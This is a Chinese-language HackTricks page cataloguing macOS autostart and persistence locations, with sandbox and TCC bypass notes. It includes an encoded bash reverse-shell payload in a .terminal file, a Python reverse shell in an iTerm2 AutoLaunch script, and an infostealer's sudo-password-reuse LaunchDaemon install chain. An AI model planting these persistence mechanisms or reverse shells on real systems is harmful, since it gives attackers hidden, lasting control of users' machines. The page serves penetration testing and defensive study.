# macOS 自动启动

{{#include ../banners/hacktricks-training.md}}

本节大量基于博客系列 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)，目标是添加**更多自动启动位置**（如果可能），指出在最新版本的 macOS（13.4）中**哪些技术仍然有效**，并说明所需的**权限**。

## Sandbox Bypass

> [!TIP]
> 这里可以找到适用于 **sandbox bypass** 的启动位置，使你能够通过**将某些内容写入文件**并等待一个非常**常见的操作**、经过**确定的时间**，或执行一个通常可以在 sandbox 内完成且无需 root 权限的**操作**，来简单地执行某些内容。

### Launchd

- 可用于 bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**：重启
- 需要 root 权限
- **`/Library/LaunchDaemons`**
- **Trigger**：重启
- 需要 root 权限
- **`/System/Library/LaunchAgents`**
- **Trigger**：重启
- 需要 root 权限
- **`/System/Library/LaunchDaemons`**
- **Trigger**：重启
- 需要 root 权限
- **`~/Library/LaunchAgents`**
- **Trigger**：重新登录
- **`~/Library/LaunchDemons`**
- **Trigger**：重新登录

> [!TIP]
> 一个有趣的事实是，**`launchd`** 在 Mach-o 的 `__Text.__config` section 中嵌入了一个 property list，其中包含其他众所周知的、launchd 必须启动的服务。此外，这些服务可以包含 `RequireSuccess`、`RequireRun` 和 `RebootOnSuccess`，这意味着它们必须运行并成功完成。
>
> 当然，由于 code signing，它无法被修改。

#### Description & Exploitation

**`launchd`** 是 OX S kernel 在启动时执行的第一个**进程**，也是关机时最后结束的进程。它的 **PID** 应始终为 **1**。该进程会**读取并执行**位于以下位置的 **ASEP** **plists** 中指定的配置：

- `/Library/LaunchAgents`：由管理员安装的每用户 agents
- `/Library/LaunchDaemons`：由管理员安装的系统范围 daemons
- `/System/Library/LaunchAgents`：由 Apple 提供的每用户 agents。
- `/System/Library/LaunchDaemons`：由 Apple 提供的系统范围 daemons。

当用户登录时，位于 `/Users/$USER/Library/LaunchAgents` 和 `/Users/$USER/Library/LaunchDemons` 中的 plists 会以**已登录用户的权限**启动。

**agents 与 daemons 之间的主要区别在于，agents 会在用户登录时加载，而 daemons 会在系统启动时加载**（例如 ssh 之类的服务需要在任何用户访问系统之前执行）。此外，agents 可以使用 GUI，而 daemons 必须在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
有些情况下，**agent 需要在用户登录之前执行**，这些 agent 被称为 **PreLoginAgents**。例如，这对于在登录时提供辅助技术很有用。它们也可以在 `/Library/LaunchAgents` 中找到（参见[**这里**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)的示例）。

> [!TIP]
> 新的 Daemons 或 Agents 配置文件将在**下次重启后，或使用** `launchctl load <target.plist>` **后加载**。使用 `launchctl -F <file>` **也可以加载不带该扩展名的 .plist 文件**（但这些 plist 文件不会在重启后自动加载）。\
> 也可以使用 `launchctl unload <target.plist>` **卸载**（其指向的进程将被终止），
>
> 若要**确保没有任何内容**（例如 override）**阻止** **Agent** 或 **Daemon** **运行**，请执行：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

列出当前用户加载的所有 agents 和 daemons：
```bash
launchctl list
```
#### 恶意 LaunchDaemon 链示例（密码复用）

最近的一个 macOS infostealer 复用了**捕获的 sudo 密码**，以写入一个 user agent 和一个 root LaunchDaemon：<sup>[1]</sup>

- 将 agent 循环写入 `~/.agent` 并使其可执行。
- 在 `/tmp/starter` 中生成一个指向该 agent 的 plist。
- 使用 `sudo -S` 复用窃取的密码，将其复制到 `/Library/LaunchDaemons/com.finder.helper.plist`，设置为 `root:wheel`，并使用 `launchctl load` 加载。
- 通过 `nohup ~/.agent >/dev/null 2>&1 &` 静默启动 agent，使输出脱离终端。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> 如果某个 plist 由用户拥有，即使它位于 daemon 的系统级文件夹中，**任务也会以该用户身份执行**，而不是以 root 身份执行。这可以阻止某些权限提升攻击。

#### 关于 launchd 的更多信息

**`launchd`** 是从 **kernel** 启动的第一个 **user mode** 进程。该进程必须**成功启动**，并且**不能退出或崩溃**。它甚至受到针对某些**终止信号**的**保护**。

`launchd` 首先会执行的操作之一，就是**启动**所有的 **daemons**，例如：

- 基于执行时间的 **Timer daemons**：
- atd (`com.apple.atrun.plist`)：具有 30 分钟的 `StartInterval`
- crond (`com.apple.systemstats.daily.plist`)：具有在 00:15 启动的 `StartCalendarInterval`
- **Network daemons**，例如：
- `org.cups.cups-lpd`：通过 TCP（`SockType: stream`）监听，使用 `SockServiceName: printer`
- SockServiceName 必须是端口，或 `/etc/services` 中的服务
- `com.apple.xscertd.plist`：监听 TCP 端口 1640
- 当指定路径发生变化时执行的 **Path daemons**：
- `com.apple.postfix.master`：检查路径 `/etc/postfix/aliases`
- **IOKit notifications daemons**：
- `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port：**
- `com.apple.xscertd-helper.plist`：在 `MachServices` 条目中指示名称 `com.apple.xscertd.helper`
- **UserEventAgent：**
- 这与前一种方式不同。它会让 launchd 响应特定事件而生成 apps。不过，在这种情况下，涉及的主要 binary 不是 `launchd`，而是 `/usr/libexec/UserEventAgent`。它会从受 SIP 限制的文件夹 `/System/Library/UserEventPlugins/` 中加载 plugins，其中每个 plugin 都会在 `XPCEventModuleInitializer` key 中指示其初始化器；对于较旧的 plugins，则会在其 `Info.plist` 的 `CFPluginFactories` dict 中、key `FB86416D-6164-2070-726F-70735C216EC0` 下指示。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- 可用于绕过 sandbox： [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass： [✅](https://emojipedia.org/check-mark-button)
- 但你需要找到一个具有 TCC bypass 的 app，且该 app 会执行加载这些文件的 shell

#### 位置

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **触发条件**：使用 zsh 打开 terminal
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **触发条件**：使用 zsh 打开 terminal
- 需要 root 权限
- **`~/.zlogout`**
- **触发条件**：使用 zsh 退出 terminal
- **`/etc/zlogout`**
- **触发条件**：使用 zsh 退出 terminal
- 需要 root 权限
- 可能还有更多内容：**`man zsh`**
- **`~/.bashrc`**
- **触发条件**：使用 bash 打开 terminal
- `/etc/profile`（未生效）
- `~/.profile`（未生效）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **触发条件**：预计会在使用 xterm 时触发，但它**未安装**；即使安装后也会抛出以下错误：xterm：`DISPLAY is not set`<sup>[3]</sup>

#### 描述与利用

启动 `zsh` 或 `bash` 等 **shell environment** 时，会运行**某些 startup files**。macOS 当前使用 `/bin/zsh` 作为默认 shell。当启动 Terminal application，或通过 SSH 访问设备时，会自动访问该 shell。虽然 macOS 中也存在 `bash` 和 `sh`，但必须显式调用它们才能使用。<sup>[2]</sup>

zsh 的 man page 可以通过 **`man zsh`** 读取，其中详细描述了 startup files。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

> [!CAUTION]
> 对我来说，配置指定的 exploitation 并注销和登录，甚至重启，都无法使该应用程序执行。（该应用程序没有被执行，可能需要在执行这些操作时让它处于运行状态）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **触发条件**：重启后重新打开应用程序

#### 描述与利用

所有要重新打开的应用程序都位于 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[4]</sup> 中。

因此，要让重新打开的应用程序启动你自己的应用程序，只需**将你的应用程序添加到列表中**。

可以通过列出该目录，或使用 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 找到 UUID。

要查看将被重新打开的应用程序，可以执行：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要**将应用程序添加到此列表中**，可以使用：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal 偏好设置

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal 曾使用用户的 FDA 权限

#### 位置

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **触发器**：打开 Terminal

#### 描述与利用

**`~/Library/Preferences`** 中存储了用户在 Applications 中的偏好设置。其中一些偏好设置可以包含用于**执行其他 applications/scripts** 的配置。<sup>[5]</sup>

例如，Terminal 可以在启动时执行命令：

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

此配置会反映在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中，如下所示：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
因此，如果系统中终端偏好设置的 plist 可以被覆盖，就可以使用 **`open`** 功能来**打开终端，并执行该命令**。

你可以通过 cli 添加此内容：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### 终端脚本 / 其他文件扩展名

- 用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
- 使用 Terminal 获取运行它的用户的 FDA 权限

#### 位置

- **任何位置**
- **触发条件**：打开 Terminal

#### 描述与利用

如果你创建并打开一个 [**`.terminal`** 脚本](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)，**Terminal application** 将自动执行其中指定的命令。如果 Terminal app 具有某些特殊权限（例如 TCC），你的命令将以这些特殊权限运行。

使用以下内容进行测试：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
你也可以使用扩展名 **`.command`**、**`.tool`**，并在其中使用常规 shell scripts 内容；它们也会由 Terminal 打开。

> [!CAUTION]
> 如果 Terminal 具有 **Full Disk Access**，它将能够完成该操作（注意，执行的命令会显示在 terminal 窗口中）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 你可能会获得一些额外的 TCC access

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- 需要 Root 权限
- **Trigger**: 重启 coreaudiod 或计算机
- **`/Library/Audio/Plug-ins/Components`**
- 需要 Root 权限
- **Trigger**: 重启 coreaudiod 或计算机
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: 重启 coreaudiod 或计算机
- **`/System/Library/Components`**
- 需要 Root 权限
- **Trigger**: 重启 coreaudiod 或计算机

#### Description

根据之前的 writeup，可以 **编译一些 audio plugins** 并使其被加载。<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 你可能会获得一些额外的 TCC access

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

当你 **触发文件预览**（在 Finder 中选中文件后按空格键），且系统中安装了一个 **支持该文件类型的 plugin** 时，QuickLook plugins 便可以被执行。<sup>[8]</sup>

你可以编译自己的 QuickLook plugin，将其放置在之前列出的位置之一以加载它，然后进入一个受支持的文件并按空格键来触发它。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> 这对我不起作用，无论是用户 LoginHook 还是 Root LogoutHook 都不行。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 你需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
- 位于 `~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可以用于在用户登录时执行命令。<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`】【。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root 用户的配置存储在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> 这里可以找到一些适用于 **sandbox bypass** 的启动位置，使你只需将某些内容**写入文件**即可执行，同时依赖一些并不常见的条件，例如安装了特定的**程序**、用户执行了“非常规”操作，或处于特定环境中。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- 可用于 bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但是，你需要能够执行 `crontab` binary
- 或者拥有 root 权限
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接写入需要 root 权限。如果你可以执行 `crontab <file>`，则不需要 root 权限
- **触发条件**：取决于 cron job

#### 描述与利用

使用以下命令列出**当前用户**的 cron jobs：
```bash
crontab -l
```
你还可以在 **`/usr/lib/cron/tabs/`** 和 **`/var/at/tabs/`** 中查看所有用户的 cron jobs（需要 root 权限）。

在 MacOS 中，可以在以下位置找到以**特定频率**执行脚本的多个文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在那里可以找到常规的 **cron** **任务**、**at** **任务**（不太常用）以及 **periodic** **任务**（主要用于清理临时文件）。例如，可以使用 `periodic daily` 执行每日的 periodic 任务。<sup>[10]</sup>

要以编程方式添加 **用户 cronjob**，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 曾拥有已授予的 TCC 权限

#### 位置

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **触发条件**：打开 iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **触发条件**：打开 iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **触发条件**：打开 iTerm

#### 描述与利用

存储在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 中的 Scripts 将被执行。例如：<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
或：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也会被执行：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`** 的 iTerm2 偏好设置可以**指定一个命令**，在打开 iTerm2 terminal 时执行。

此设置可以在 iTerm2 设置中配置：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

该命令会反映在偏好设置中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
你可以使用以下命令设置要执行的命令：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **很可能还有其他方式可以滥用 iTerm2 preferences 来执行任意命令。**

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 xbar
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Accessibility 权限

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**：xbar 执行后

#### Description

如果已安装流行程序 [**xbar**](https://github.com/matryer/xbar)，则可以在 **`~/Library/Application\ Support/xbar/plugins/`** 中编写 shell script，该 script 会在 xbar 启动时执行：<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**说明**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 Hammerspoon
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Accessibility 权限

#### 位置

- **`~/.hammerspoon/init.lua`**
- **触发条件**: 执行 hammerspoon 后

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一个用于 **macOS** 的自动化平台，利用 **LUA 脚本语言**执行操作。值得注意的是，它支持集成完整的 AppleScript 代码以及执行 shell 脚本，从而显著增强了其脚本功能。<sup>[13]</sup>

该应用会查找单个文件 `~/.hammerspoon/init.lua`，启动后将执行其中的脚本。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 BetterTouchTool
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它请求 Automation-Shortcuts 和 Accessibility 权限

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

此工具允许指定在按下某些快捷键时执行的应用程序或脚本。攻击者可能能够在数据库中配置自己的 **shortcut 和 action 来执行代码**，从而执行任意代码（shortcut 可以只是按下某个键）。

### Alfred

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 Alfred
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它请求 Automation、Accessibility，甚至 Full-Disk access 权限

#### Location

- `???`

它允许创建在满足特定条件时执行代码的 workflows。攻击者可能可以创建一个 workflow 文件并让 Alfred 加载它（使用 workflows 需要购买 premium 版本）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须启用并使用 ssh
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH 使用 FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: 通过 ssh 登录
- **`/etc/ssh/sshrc`**
- 需要 Root
- **Trigger**: 通过 ssh 登录

> [!CAUTION]
> 要开启 ssh，需要 Full Disk Access：
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置 `PermitUserRC no`，否则当用户**通过 SSH 登录**时，将执行脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`**。<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但需要使用参数执行 `osascript`
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** 登录
- Exploit payload 通过调用 **`osascript`** 存储
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** 登录
- 需要 Root

#### Description

在 System Preferences -> Users & Groups -> **Login Items** 中，可以找到**用户登录时执行的项目**。\
可以从命令行列出、添加和移除这些项目：<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** 中。

**Login items** 也可以通过 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) 指定，该 API 会将配置存储在 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** 中。

### ZIP as Login Item

（查看前面关于 Login Items 的章节，这是一个扩展）

如果将 **ZIP** 文件存储为 **Login Item**，**`Archive Utility`** 会打开它。如果该 zip 文件例如存储在 **`~/Library`** 中，并且包含带有 backdoor 的文件夹 **`LaunchAgents/file.plist`**，则该文件夹会被创建（默认情况下不存在），并添加该 plist。因此，用户下次再次登录时，**plist 中指定的 backdoor 将被执行**。

另一种选择是在用户 HOME 中创建文件 **`.bash_profile`** 和 **`.zshenv`**，这样即使 LaunchAgents 文件夹已经存在，该技术仍然有效。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但需要 **执行** **`at`**，并且它必须处于**启用**状态
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 需要 **执行** **`at`**，并且它必须处于**启用**状态

#### **Description**

`at` 任务用于**安排一次性任务**，使其在指定时间执行。与 cron jobs 不同，`at` 任务在执行后会被自动删除。需要特别注意的是，这些任务会在系统重启后持续存在，因此在某些情况下可能构成安全风险。<sup>[16]</sup>

**默认情况下**它们处于**禁用**状态，但 **root** 用户可以使用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在 1 小时后创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
使用 `atq` 检查作业队列：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上面可以看到两个已计划的任务。我们可以使用 `at -c JOBNUMBER` 打印任务的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> 如果未启用 AT tasks，创建的任务将不会执行。

**job files** 位于 `/private/var/at/jobs/`。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
文件名包含队列、job 编号以及计划运行的时间。例如，我们来看看 `a0001a019bdcd2`。

- `a` - 这是队列
- `0001a` - 以十六进制表示的 job 编号，`0x1a = 26`
- `019bdcd2` - 以十六进制表示的时间。它表示自 epoch 起经过的分钟数。`0x019bdcd2` 的十进制值为 `26991826`。将其乘以 60 后得到 `1619509560`，即 `GMT: 2021年4月27日，星期二 7:46:00`。

如果我们打印 job 文件，就会发现其中包含的信息与使用 `at -c` 得到的信息相同。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
